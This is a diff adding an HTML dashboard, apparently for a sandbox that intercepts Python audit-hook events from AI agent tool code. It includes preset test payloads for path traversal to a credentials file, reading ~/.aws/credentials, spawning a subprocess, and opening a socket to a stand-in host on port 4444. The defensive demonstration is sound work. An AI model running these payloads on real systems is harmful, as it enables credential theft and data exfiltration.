@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>AGENT-RUNTIME-EDR v2.0 // REAL SUBPROCESS &amp; PEP578 SANDBOX</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Space+Mono:wght@700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #06080c;
+    --panel: #0d1117;
+    --border: #1e293b;
+    --neon: #00ff9d;
+    --danger: #ff3366;
+    --warn: #f59e0b;
+    --text: #e2e8f0;
+    --muted: #64748b;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: 'JetBrains Mono', monospace; padding: 20px; font-size: 12px; }
+  header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); padding-bottom: 12px; margin-bottom: 16px; }
+  .brand { font-family: 'Space Mono', monospace; font-size: 17px; color: var(--neon); }
+  .badge { border: 1px solid var(--neon); color: var(--neon); padding: 4px 10px; font-size: 11px; background: rgba(0,255,157,0.08); }
+  .metrics { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 16px; }
+  .card { background: var(--panel); border: 1px solid var(--border); padding: 14px; }
+  .card-title { color: var(--muted); font-size: 11px; text-transform: uppercase; margin-bottom: 6px; }
+  .card-val { font-size: 22px; font-weight: 700; color: var(--neon); }
+  .card-val.danger { color: var(--danger); }
+  .layout { display: grid; grid-template-columns: 420px 1fr; gap: 16px; }
+  h3 { color: var(--neon); font-size: 12px; text-transform: uppercase; margin-bottom: 10px; }
+  textarea { width: 100%; height: 125px; background: #05070a; color: var(--neon); border: 1px solid var(--border); padding: 10px; font-family: inherit; font-size: 12px; margin-bottom: 8px; }
+  .btn { width: 100%; padding: 9px 10px; background: #111827; color: var(--text); border: 1px solid var(--border); font-family: inherit; font-size: 11px; text-align: left; cursor: pointer; margin-bottom: 6px; }
+  .btn:hover { border-color: var(--neon); color: var(--neon); }
+  .btn.attack:hover { border-color: var(--danger); color: var(--danger); }
+  .btn-run { background: rgba(0,255,157,0.12); border-color: var(--neon); color: var(--neon); font-weight: 700; text-align: center; }
+  .out-box { background: #05070a; border: 1px solid var(--border); padding: 10px; margin-top: 8px; font-size: 11px; white-space: pre-wrap; }
+  table { width: 100%; border-collapse: collapse; font-size: 11px; }
+  th, td { padding: 8px; border-bottom: 1px solid var(--border); text-align: left; word-break: break-all; }
+  th { color: var(--muted); text-transform: uppercase; }
+  .allow { color: var(--neon); border: 1px solid var(--neon); padding: 2px 5px; font-size: 10px; }
+  .block { color: var(--danger); border: 1px solid var(--danger); background: rgba(255,51,102,0.15); padding: 2px 5px; font-size: 10px; font-weight: 700; }
+</style>
+</head>
+<body>
+<header>
+  <div class="brand">[AGENT-RUNTIME-EDR v2.0] // REAL OS WORKER SANDBOX &amp; PEP-578 INTERCEPTOR</div>
+  <div id="mode-badge" class="badge">LOADING...</div>
+</header>
+
+<div class="metrics">
+  <div class="card"><div class="card-title">Total Real Syscalls Audited (SQLite WAL)</div><div class="card-val" id="m-total">0</div></div>
+  <div class="card"><div class="card-title">Synchronous -EPERM Blocks</div><div class="card-val danger" id="m-blocked">0</div></div>
+  <div class="card"><div class="card-title">Compliant Operations Allowed</div><div class="card-val" id="m-allowed">0</div></div>
+</div>
+
+<div class="layout">
+  <div class="card">
+    <h3>// Execute Real Python Code in Isolated Worker Process</h3>
+    <textarea id="code-box"></textarea>
+    <button class="btn btn-run" onclick="runSnippet()">[▶] SPAWN OS WORKER &amp; ENFORCE AUDIT HOOKS</button>
+    <div id="worker-result" class="out-box">Ready to spawn worker process...</div>
+
+    <h3 style="margin-top:14px;">// Load Real Exploit Payloads</h3>
+    <button class="btn" onclick="loadPayload('benign')">[+] 1. Benign: Read Allowed Workspace File (q3_threat_intel.md)</button>
+    <button class="btn attack" onclick="loadPayload('traversal')">[!] 2. Exploit: Path Traversal (../host_secrets/prod_db_credentials.env)</button>
+    <button class="btn attack" onclick="loadPayload('cred')">[!] 3. Exploit: Read ~/.aws/credentials</button>
+    <button class="btn attack" onclick="loadPayload('rce')">[!] 4. Exploit: Subprocess Shell Spawn (subprocess.Popen)</button>
+    <button class="btn attack" onclick="loadPayload('exfil')">[!] 5. Exploit: Outbound TCP Socket Exfiltration (socket.connect)</button>
+  </div>
+
+  <div class="card">
+    <h3>// Live SQLite WAL Syscall Audit Log (Real Worker Processes)</h3>
+    <table>
+      <thead>
+        <tr>
+          <th>PID</th>
+          <th>Hook Event</th>
+          <th>Requested Target</th>
+          <th>Canonical Resolved Path / Host</th>
+          <th>Reason</th>
+          <th>Verdict</th>
+        </tr>
+      </thead>
+      <tbody id="audit-body"></tbody>
+    </table>
+  </div>
+</div>
+
+<script>
+let workspaceDir = "";
+
+const PAYLOADS = {
+  benign: `with open(r"__WS__/q3_threat_intel.md", "r") as f:
+    RESULT = f.read().strip()`,
+  traversal: `with open(r"__WS__/../host_secrets/prod_db_credentials.env", "r") as f:
+    RESULT = f.read()`,
+  cred: `with open("/home/ubuntu/.aws/credentials", "r") as f:
+    RESULT = f.read()`,
+  rce: `p = subprocess.Popen(["whoami"], stdout=subprocess.PIPE)
+RESULT = p.communicate()[0].decode()`,
+  exfil: `s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("198.51.100.42", 4444))
+RESULT = "Connected"`
+};
+
+function loadPayload(key) {
+  const raw = PAYLOADS[key].replace("__WS__", workspaceDir);
+  document.getElementById("code-box").value = raw;
+}
+
+async function refreshTelemetry() {
+  const res = await fetch("/v1/edr/telemetry");
+  const data = await res.json();
+  workspaceDir = data.workspace_dir;
+  if (!document.getElementById("code-box").value) {
+    loadPayload("benign");
+  }
+  document.getElementById("mode-badge").textContent = data.engine_mode;
+  document.getElementById("m-total").textContent = data.metrics.total_events;
+  document.getElementById("m-blocked").textContent = data.metrics.blocked_eperm;
+  document.getElementById("m-allowed").textContent = data.metrics.allowed_events;
+
+  const tbody = document.getElementById("audit-body");
+  tbody.innerHTML = data.records.map(r => `
+    <tr>
+      <td>${r.worker_pid}</td>
+      <td style="color:var(--warn);">${r.event_name}</td>
+      <td>${r.target}</td>
+      <td>${r.canonical_target}</td>
+      <td>${r.reason}</td>
+      <td><span class="${r.verdict === 'ALLOW' ? 'allow' : 'block'}">${r.verdict}</span></td>
+    </tr>
+  `).join("");
+}
+
+async function runSnippet() {
+  const code = document.getElementById("code-box").value;
+  document.getElementById("worker-result").textContent = "Spawning isolated OS worker...";
+  const res = await fetch("/v1/edr/execute", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      session_id: "sess-live-console",
+      agent_name: "mcp-tool-runner",
+      code_snippet: code
+    })
+  });
+  const out = await res.json();
+  document.getElementById("worker-result").textContent =
+    `Worker PID: ${out.worker_pid} | Status: ${out.status}
+Output: ${out.output}`;
+  refreshTelemetry();
+}
+
+refreshTelemetry();
+setInterval(refreshTelemetry, 2500);
+</script>
+</body>
+</html>
